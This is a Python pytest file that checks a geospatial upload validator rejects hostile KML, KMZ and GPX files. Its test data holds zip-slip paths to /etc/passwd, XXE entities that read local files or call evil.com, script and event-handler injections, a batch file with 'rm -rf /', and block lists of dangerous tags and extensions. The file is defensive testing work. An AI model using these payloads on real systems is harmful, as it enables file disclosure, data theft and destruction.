"""
Security attack scenario tests.

Tests specific security vulnerabilities and attack vectors:
- Zip slip attacks
- XXE (XML External Entity) attacks
- Dangerous XML elements and attributes
- File type spoofing
- Path traversal
"""
import io
import os
import zipfile
from io import BytesIO

import pytest
from django.core.files.uploadedfile import SimpleUploadedFile

from geo_lib.security.SecureFileValidator import validate_file
from geo_lib.security.exceptions import FileValidationError, SecurityError
from geo_lib.security.SecureFileValidator import validate_kml_content, secure_kmz_to_kml


class TestZipSlipAttacks:
    """Test protection against zip slip attacks."""

    def test_zip_slip_absolute_path(self):
        """Test that absolute paths in KMZ are rejected."""
        kml_content = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Test</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        # Create KMZ with absolute path
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('/etc/passwd', 'malicious content')
            zip_file.writestr('doc.kml', kml_content)
        
        file = SimpleUploadedFile("test.kmz", zip_buffer.getvalue(), content_type='application/zip')
        is_valid, message = validate_file(file)
        
        assert is_valid is False
        assert "invalid" in message.lower() or "path" in message.lower()

    def test_zip_slip_directory_traversal(self):
        """Test that directory traversal paths (..) in KMZ are rejected."""
        kml_content = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Test</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        # Create KMZ with directory traversal
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('../../etc/passwd', 'malicious content')
            zip_file.writestr('doc.kml', kml_content)
        
        file = SimpleUploadedFile("test.kmz", zip_buffer.getvalue(), content_type='application/zip')
        is_valid, message = validate_file(file)
        
        assert is_valid is False
        assert "invalid" in message.lower() or "path" in message.lower()

    def test_zip_slip_leading_slash(self):
        """Test that paths starting with / are rejected."""
        kml_content = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Test</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        # Create KMZ with leading slash
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('/malicious.txt', 'malicious content')
            zip_file.writestr('doc.kml', kml_content)
        
        file = SimpleUploadedFile("test.kmz", zip_buffer.getvalue(), content_type='application/zip')
        is_valid, message = validate_file(file)
        
        assert is_valid is False
        assert "invalid" in message.lower() or "path" in message.lower()

    def test_zip_slip_in_secure_kmz_to_kml(self):
        """Test that secure_kmz_to_kml rejects zip slip attacks."""
        kml_content = """<?xml version="1.0"?><kml><Document><Placemark><name>Test</name></Placemark></Document></kml>"""
        
        # Create KMZ with directory traversal
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('../../etc/passwd', 'malicious')
            zip_file.writestr('doc.kml', kml_content)
        
        with pytest.raises(SecurityError) as exc_info:
            secure_kmz_to_kml(zip_buffer.getvalue())
        
        assert "path" in str(exc_info.value).lower() or "invalid" in str(exc_info.value).lower()


class TestXXEAttacks:
    """Test protection against XXE (XML External Entity) attacks."""

    def test_xxe_external_entity(self):
        """Test that external entity references are blocked."""
        # XXE attack attempt
        xxe_kml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE kml [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>&xxe;</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", xxe_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        # Should either reject or fail to parse (secure parser should block entities)
        # The secure parser should prevent entity expansion
        assert is_valid is False or "invalid" in message.lower() or "parse" in message.lower()

    def test_xxe_parameter_entity(self):
        """Test that parameter entities are blocked."""
        xxe_kml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE kml [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Test</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", xxe_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        # Should reject or fail to parse
        assert is_valid is False

    def test_xxe_http_entity(self):
        """Test that HTTP entity references are blocked."""
        xxe_kml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE kml [
  <!ENTITY xxe SYSTEM "http://evil.com/steal">
]>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>&xxe;</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", xxe_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        # Should reject or fail to parse
        assert is_valid is False


class TestDangerousElements:
    """Test detection and rejection of dangerous XML elements."""

    def test_script_element(self):
        """Test that script elements are rejected."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Dangerous</name>
      <script>alert('XSS')</script>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False
        assert "safely" in message.lower() or "dangerous" in message.lower() or "script" in message.lower()

    def test_iframe_element(self):
        """Test that iframe elements are rejected."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Dangerous</name>
      <iframe src="evil.com"></iframe>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False
        assert "safely" in message.lower() or "dangerous" in message.lower()

    def test_object_element(self):
        """Test that object elements are rejected."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Dangerous</name>
      <object data="evil.swf"></object>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False

    def test_embed_element(self):
        """Test that embed elements are rejected."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Dangerous</name>
      <embed src="evil.swf"></embed>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False

    def test_form_element(self):
        """Test that form elements are rejected."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Dangerous</name>
      <form action="evil.com">
        <input type="text" name="data">
      </form>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False

    def test_all_dangerous_elements(self):
        """Test that all dangerous elements are detected."""
        dangerous_elements = ['script', 'iframe', 'object', 'embed', 'applet', 'form', 'input', 'button', 'meta']
        
        for element in dangerous_elements:
            dangerous_kml = f"""<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Dangerous</name>
      <{element}>malicious content</{element}>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
            
            file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
            is_valid, message = validate_file(file)
            
            assert is_valid is False, f"Element {element} should be rejected"

    def test_dangerous_elements_case_insensitive(self):
        """Test that dangerous elements are detected case-insensitively."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Dangerous</name>
      <SCRIPT>alert('XSS')</SCRIPT>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False


class TestDangerousAttributes:
    """Test detection and rejection of dangerous XML attributes."""

    def test_onclick_attribute(self):
        """Test that onclick attributes are rejected."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark onclick="alert('XSS')">
      <name>Dangerous</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False
        assert "safely" in message.lower() or "dangerous" in message.lower() or "attribute" in message.lower()

    def test_onload_attribute(self):
        """Test that onload attributes are rejected."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document onload="evil()">
    <Placemark>
      <name>Dangerous</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False

    def test_onerror_attribute(self):
        """Test that onerror attributes are rejected."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark onerror="evil()">
      <name>Dangerous</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False

    def test_all_dangerous_attributes(self):
        """Test that all dangerous attributes are detected."""
        dangerous_attributes = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'onblur', 
                               'onchange', 'onsubmit', 'onreset', 'onselect', 'onunload']
        
        for attr in dangerous_attributes:
            dangerous_kml = f"""<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark {attr}="evil()">
      <name>Dangerous</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
            
            file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
            is_valid, message = validate_file(file)
            
            assert is_valid is False, f"Attribute {attr} should be rejected"

    def test_dangerous_attributes_case_insensitive(self):
        """Test that dangerous attributes are detected case-insensitively."""
        dangerous_kml = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark ONCLICK="alert('XSS')">
      <name>Dangerous</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        file = SimpleUploadedFile("test.kml", dangerous_kml.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False


class TestSuspiciousFilesInKmz:
    """Test detection of suspicious file types in KMZ archives."""

    def test_exe_file_in_kmz(self):
        """Test that executable files in KMZ are rejected."""
        kml_content = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Test</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('doc.kml', kml_content)
            zip_file.writestr('malicious.exe', b'fake executable')
        
        file = SimpleUploadedFile("test.kmz", zip_buffer.getvalue(), content_type='application/zip')
        is_valid, message = validate_file(file)
        
        assert is_valid is False
        assert "unsupported" in message.lower() or "file types" in message.lower()

    def test_bat_file_in_kmz(self):
        """Test that batch files in KMZ are rejected."""
        kml_content = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Test</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr('doc.kml', kml_content)
            zip_file.writestr('malicious.bat', b'@echo off\nrm -rf /')
        
        file = SimpleUploadedFile("test.kmz", zip_buffer.getvalue(), content_type='application/zip')
        is_valid, message = validate_file(file)
        
        assert is_valid is False

    def test_all_suspicious_extensions(self):
        """Test that all suspicious file extensions are detected."""
        suspicious_extensions = ['.exe', '.bat', '.cmd', '.scr', '.pif']
        
        kml_content = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <Placemark>
      <name>Test</name>
      <Point>
        <coordinates>-122.4194,37.7749,0</coordinates>
      </Point>
    </Placemark>
  </Document>
</kml>"""
        
        for ext in suspicious_extensions:
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                zip_file.writestr('doc.kml', kml_content)
                zip_file.writestr(f'malicious{ext}', b'malicious content')
            
            file = SimpleUploadedFile("test.kmz", zip_buffer.getvalue(), content_type='application/zip')
            is_valid, message = validate_file(file)
            
            assert is_valid is False, f"Extension {ext} should be rejected"


class TestFileTypeSpoofing:
    """Test protection against file type spoofing."""

    def test_kml_with_kmz_extension(self):
        """Test that KML content with .kmz extension is rejected."""
        kml_content = b'<?xml version="1.0"?><kml></kml>'
        
        file = SimpleUploadedFile("test.kmz", kml_content, content_type='application/zip')
        is_valid, message = validate_file(file)
        
        # Should fail signature check (KML content doesn't match KMZ signature)
        assert is_valid is False

    def test_zip_with_kml_extension(self):
        """Test that ZIP content with .kml extension is rejected."""
        zip_content = b'PK\x03\x04fake zip'
        
        file = SimpleUploadedFile("test.kml", zip_content, content_type='text/xml')
        is_valid, message = validate_file(file)
        
        # Should fail signature check (ZIP content doesn't match KML signature)
        assert is_valid is False

    def test_binary_with_xml_extension(self):
        """Test that binary content with XML extension is rejected."""
        binary_content = bytes([0xFF, 0xFE, 0x00, 0x01] * 100)
        
        file = SimpleUploadedFile("test.kml", binary_content, content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False


class TestGpxSecurity:
    """Test security validation for GPX files."""

    def test_gpx_with_dangerous_element(self):
        """Test that GPX files with dangerous elements are rejected."""
        dangerous_gpx = """<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="Test">
  <trk>
    <name>Dangerous</name>
    <script>alert('XSS')</script>
    <trkseg>
      <trkpt lat="37.7749" lon="-122.4194">
        <ele>100</ele>
      </trkpt>
    </trkseg>
  </trk>
</gpx>"""
        
        file = SimpleUploadedFile("test.gpx", dangerous_gpx.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False

    def test_gpx_with_dangerous_attribute(self):
        """Test that GPX files with dangerous attributes are rejected."""
        dangerous_gpx = """<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="Test" onclick="evil()">
  <trk>
    <name>Dangerous</name>
    <trkseg>
      <trkpt lat="37.7749" lon="-122.4194">
        <ele>100</ele>
      </trkpt>
    </trkseg>
  </trk>
</gpx>"""
        
        file = SimpleUploadedFile("test.gpx", dangerous_gpx.encode('utf-8'), content_type='text/xml')
        is_valid, message = validate_file(file)
        
        assert is_valid is False

